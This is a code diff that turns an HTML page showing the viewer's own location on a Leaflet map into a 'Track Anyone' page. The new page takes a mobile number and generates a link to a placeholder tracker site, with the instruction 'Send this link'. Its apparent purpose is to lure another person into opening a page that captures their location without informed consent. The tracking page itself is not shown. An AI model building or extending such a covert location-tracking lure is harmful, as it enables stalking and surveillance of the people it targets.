@@ -1,60 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Live Map Tracker</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link
-    rel="stylesheet"
-    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-  />
-  <style>
-    #map {
-      height: 100vh;
-      width: 100%;
-    }
-  </style>
+  <title>Track Anyone</title>
 </head>
 <body>
+  <h2>Enter Mobile Number to Track</h2>
+  <input type="text" id="phone" placeholder="Enter mobile number" />
+  <button onclick="generateLink()">Generate Link</button>
+  <p id="linkDisplay"></p>
 
-<div id="map"></div>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-  let map = L.map('map').setView([0, 0], 15);
-  let marker = null;
-
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '&copy; OpenStreetMap contributors'
-  }).addTo(map);
-
-  function updateMap(lat, lng) {
-    if (marker) {
-      marker.setLatLng([lat, lng]);
-    } else {
-      marker = L.marker([lat, lng]).addTo(map);
-    }
-    map.setView([lat, lng]);
-  }
-
-  if (navigator.geolocation) {
-    navigator.geolocation.watchPosition(
-      (position) => {
-        const lat = position.coords.latitude;
-        const lng = position.coords.longitude;
-        updateMap(lat, lng);
-      },
-      (error) => {
-        alert("Error getting location: " + error.message);
-      },
-      {
-        enableHighAccuracy: true,
-        maximumAge: 1000
+  <script>
+    function generateLink() {
+      const number = document.getElementById("phone").value.trim();
+      if (!number) {
+        alert("Enter a valid number");
+        return;
       }
-    );
-  } else {
-    alert("Geolocation not supported.");
-  }
-</script>
-
+      const link = `https://your-tracker-site.com/track.html?phone=${encodeURIComponent(number)}`;
+      document.getElementById("linkDisplay").innerHTML = `
+        <strong>Send this link:</strong> <a href="${link}" target="_blank">${link}</a>
+      `;
+    }
+  </script>
 </body>
 </html>
